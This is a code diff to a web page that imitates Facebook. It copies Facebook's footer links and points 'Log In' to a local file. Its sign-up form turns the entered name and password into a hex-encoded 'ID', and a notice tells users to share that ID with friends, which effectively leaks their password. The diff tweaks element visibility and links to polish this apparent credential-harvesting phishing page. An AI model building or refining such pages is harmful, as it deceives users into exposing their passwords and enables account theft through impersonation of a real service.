@@ -318,6 +318,7 @@ p{
   margin: 50px 10px 0 50px;
   width: 90%;
   text-align: center;
+visibility: hidden;
 }
 #id #b2{
 		background: #00A1E1;
@@ -678,6 +679,7 @@ p{
   margin: 50px 20px 0 20px;
   width: 95%;
   text-align: center;
+visibility: hidden;
 }
 #id #b2{
 		background: #00A1E1;
@@ -707,6 +709,7 @@ p{
   margin: 50px 0 0 300px;
   width: 100%;
   text-align: center;
+visibility: hidden;
 }
 #id #b2{
 		background: #00A1E1;
@@ -834,7 +837,7 @@ p{
 			</ul>
 			<div class="ho-rule"></div>
 			<ul class="ul2">
-				<li><a href="facebook.com">Sign Up</a></li><li><a href="#">Log In</a></li><li><a href="facebook.com">Messenger</a></li><li><a href="facebook.com">Facebook Lite</a></li><li><a href="facebook.com">Mobile</a></li><li><a href="facebook.com">Find Friends</a></li><li><a href="facebook.com">People</a></li><li><a href="facebook.com">Pages</a></li><li><a href="facebook.com">Video interests</a></li><li><a href="facebook.com">Places</a></li><li><a href="facebook.com">Games</a></li><li><a href="facebook.com">Locations</a></li><li><a href="facebook.com">Marketplace</a></li><li><a href="facebook.com">Groups</a></li><li><a href="facebook.com">Instagram</a></li><li><a href="facebook.com">Local</a></li><li><a href="facebook.com">About</a></li><li><a href="facebook.com">Create ad</a></li><li><a href="facebook.com">Create Page</a></li><li><a href="facebook.com">Developers</a></li><li><a href="facebook.com">Careers</a></li><li><a href="facebook.com">Privacy</a></li><li><a href="facebook.com">Cookies</a></li><li><a href="facebook.com">AdChoices</a></li><li><a href="facebook.com">Terms</a></li><li><a href="facebook.com">Help</a></li><li><a href="facebook.com">Settings</a></li><li><a href="facebook.com">Activity log</a></li>
+				<li><a href="facebook.com">Sign Up</a></li><li><a href="/storage/emulated/0/TrebEdit/fb.html">Log In</a></li><li><a href="facebook.com">Messenger</a></li><li><a href="facebook.com">Facebook Lite</a></li><li><a href="facebook.com">Mobile</a></li><li><a href="facebook.com">Find Friends</a></li><li><a href="facebook.com">People</a></li><li><a href="facebook.com">Pages</a></li><li><a href="facebook.com">Video interests</a></li><li><a href="facebook.com">Places</a></li><li><a href="facebook.com">Games</a></li><li><a href="facebook.com">Locations</a></li><li><a href="facebook.com">Marketplace</a></li><li><a href="facebook.com">Groups</a></li><li><a href="facebook.com">Instagram</a></li><li><a href="facebook.com">Local</a></li><li><a href="facebook.com">About</a></li><li><a href="facebook.com">Create ad</a></li><li><a href="facebook.com">Create Page</a></li><li><a href="facebook.com">Developers</a></li><li><a href="facebook.com">Careers</a></li><li><a href="facebook.com">Privacy</a></li><li><a href="facebook.com">Cookies</a></li><li><a href="facebook.com">AdChoices</a></li><li><a href="facebook.com">Terms</a></li><li><a href="facebook.com">Help</a></li><li><a href="facebook.com">Settings</a></li><li><a href="facebook.com">Activity log</a></li>
 			</ul>
 			<p>Facebook © 2020</p>
 		</div>
@@ -843,7 +846,7 @@ p{
 <h3>ID: </h3>
 <b id="b2">Your ID will appear here after signing up</b>
 <h3 id="h32">Notice: Share this ID with friends and users so that they find you</h3>
-<a href="/pages/features.html" id="fme"><b>Click to Continue >>></b></b></b></b></a>
+<a href="" id="fme"><b>Click to Continue >>></b></b></b></b></a>
 </div>
   <script src="http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script>
@@ -861,6 +864,7 @@ function ascii_to_hexa(str)
 <script>
 var fm = document.getElementById("fme");
 var to = document.getElementById("scs");
+var omn = document.getElementById("id");
 fm.style.visibility = "hidden";
 function validateform(){
 var name=document.myform.name.value;
@@ -874,6 +878,7 @@ ascii_to_hexa(name+password);
 	elem22.innerHTML = "#"+ascii_to_hexa(name)+"2a1q1z2"+ascii_to_hexa(password);
 	fm.style.visibility = "visible";
 	to.style.visibility = "visible";
+omn.style.visibility = "visible";
 	return false;
 }
 else{
